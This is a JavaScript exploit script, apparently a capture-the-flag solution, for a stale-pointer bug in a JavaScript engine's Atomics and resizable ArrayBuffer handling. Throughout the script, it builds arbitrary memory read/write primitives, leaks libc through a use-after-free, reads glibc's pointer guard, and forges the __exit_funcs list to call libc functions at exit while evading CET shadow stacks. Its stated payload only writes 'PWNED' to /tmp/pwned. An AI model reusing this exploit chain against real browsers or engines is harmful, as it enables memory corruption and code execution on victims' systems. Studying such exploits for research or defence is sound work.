// Exploit for Atomics+Resizable ArrayBuffer stale-pointer bug.
// Goal: write exactly "PWNED" to /tmp/pwned
//
// Shadow stack is enabled and cannot be disabled (kernel locks CET). So we avoid ROP/ret.
// Instead we hijack glibc's atexit list (__exit_funcs) to call real libc functions.
//
// Plan at exit (executed in this order):
//   close(0);
//   close(1);
//   creat("/tmp/pwned", 0)   -> fd 0
//   fchmod(0, 0644)          (via ef_on signature: status=0, arg=0x1a4)
//   creat("/tmp/pwned", 0)   -> fd 1
//   printf("PWNED")           (writes to stdout fd=1 -> /tmp/pwned)
//   fflush(NULL)
//
// We must pointer-mangle function pointers stored in the exit list.

function make_rw_view(addrBigInt, qwords) {
    // Overwrite u.array.u.ptr of a freshly allocated BigUint64Array JSObject.
    let rab = new ArrayBuffer(0x48, { maxByteLength: 0x1000 });
    let ta = new BigUint64Array(rab);

    let backing = new ArrayBuffer(qwords * 8);
    let view;
    let evil = {
        valueOf: function () {
            rab.resize(0x1000);
            view = new BigUint64Array(backing);
            return addrBigInt;
        }
    };

    // index 7 => offset 0x38 from rab base (u.array.u.ptr)
    Atomics.store(ta, 7, evil);
    return view;
}

function read64(addr) {
    return make_rw_view(addr, 1)[0];
}

function write64(addr, val) {
    let v = make_rw_view(addr, 1);
    v[0] = val;
}

function write_bytes(addr, bytes) {
    for (let i = 0; i < bytes.length; i += 8) {
        let q = 0n;
        for (let j = 0; j < 8 && (i + j) < bytes.length; j++) {
            q |= BigInt(bytes[i + j]) << (8n * BigInt(j));
        }
        write64(addr + BigInt(i), q);
    }
}

function str_bytes(s) {
    let arr = [];
    for (let i = 0; i < s.length; i++) {
        arr.push(s.charCodeAt(i) & 0xff);
    }
    return arr;
}

function rol64(x, r) {
    r &= 63n;
    const mask = (1n << 64n) - 1n;
    return ((x << r) | (x >> (64n - r))) & mask;
}

function ptr_mangle(ptr, guard) {
    // glibc PTR_MANGLE: xor guard; rol 0x11
    return rol64(ptr ^ guard, 0x11n);
}

// --- 1) Leak a libc pointer via UAF read on freed chunk metadata (unsorted bin) ---
let leak_rab = new ArrayBuffer(0x500, { maxByteLength: 0x2000 });
let leak_u64 = new BigUint64Array(leak_rab);
// Block in-place growth so realloc must move and free the old chunk
let blocker = new ArrayBuffer(0x1000);
let evil_leak = {
    valueOf: function () {
        leak_rab.resize(0x1000);
        return 0n;
    }
};
let libc_leak = Atomics.add(leak_u64, 0, evil_leak);

// --- 2) Find libc base by scanning down for ELF header ---
function find_libc_base(leak) {
    let addr = leak & ~0xfffn;
    for (let i = 0; i < 0x4000; i++) {
        let v = read64(addr);
        if ((v & 0xffffffffn) === 0x464c457fn) {
            return addr;
        }
        addr -= 0x1000n;
    }
    throw "libc base not found";
}

let libc_base = find_libc_base(libc_leak);

// --- 3) Find fs_base to read pointer_guard (for PTR_MANGLE) ---
function find_fs_base(libc_base) {
    let start = libc_base - 0x2000n;
    for (let off = 0n; off < 0x2000n; off += 8n) {
        let cand = start + off;
        let v = read64(cand);
        if (v === cand) {
            return cand;
        }
    }
    throw "fs_base not found";
}

let fs_base = find_fs_base(libc_base);
let ptr_guard = read64(fs_base + 0x30n);

// --- 4) Build fake __exit_funcs list in libc .bss and install it ---
const OFF___exit_funcs = 0x203680n;

// libc function offsets
const OFF_close = 0x116710n;
const OFF_creat = 0x1168d0n;
const OFF_fchmod = 0x116dc0n;
const OFF_printf = 0x60100n;
const OFF_fflush = 0x857f0n;

// Use slack bss region near end of RW segment
let scratch = libc_base + 0x211200n;
let exit_list = scratch;
let path = scratch + 0x500n;
let data = scratch + 0x520n;

write_bytes(path, str_bytes("/tmp/pwned\0"));
write_bytes(data, str_bytes("PWNED\0"));

const EF_ON = 2n;
const EF_CXA = 4n;

function write_exit_cxa(entry_index, func_addr, arg_val) {
    let base = exit_list + 16n + 32n * BigInt(entry_index);
    write64(base + 0n, EF_CXA);
    write64(base + 8n, ptr_mangle(func_addr, ptr_guard));
    write64(base + 16n, arg_val);
    write64(base + 24n, 0n);
}

function write_exit_on(entry_index, func_addr, arg_val) {
    let base = exit_list + 16n + 32n * BigInt(entry_index);
    write64(base + 0n, EF_ON);
    write64(base + 8n, ptr_mangle(func_addr, ptr_guard));
    write64(base + 16n, arg_val);
    write64(base + 24n, 0n);
}

// List header
write64(exit_list + 0n, 0n);      // next = NULL (last element; won't be freed)
write64(exit_list + 8n, 7n);      // idx = 7 handlers

// Handlers execute in order: fns[6] .. fns[0]
write_exit_cxa(6, libc_base + OFF_close, 0n);      // close(0)
write_exit_cxa(5, libc_base + OFF_close, 1n);      // close(1)
write_exit_cxa(4, libc_base + OFF_creat, path);    // creat(path, 0) -> fd 0
write_exit_on (3, libc_base + OFF_fchmod, 0x1a4n); // fchmod(0, 0644)
write_exit_cxa(2, libc_base + OFF_creat, path);    // creat(path, 0) -> fd 1
write_exit_cxa(1, libc_base + OFF_printf, data);   // printf("PWNED")
write_exit_cxa(0, libc_base + OFF_fflush, 0n);     // fflush(NULL)

// Install list
write64(libc_base + OFF___exit_funcs, exit_list);

// Script ends with status 0; exit handlers run.
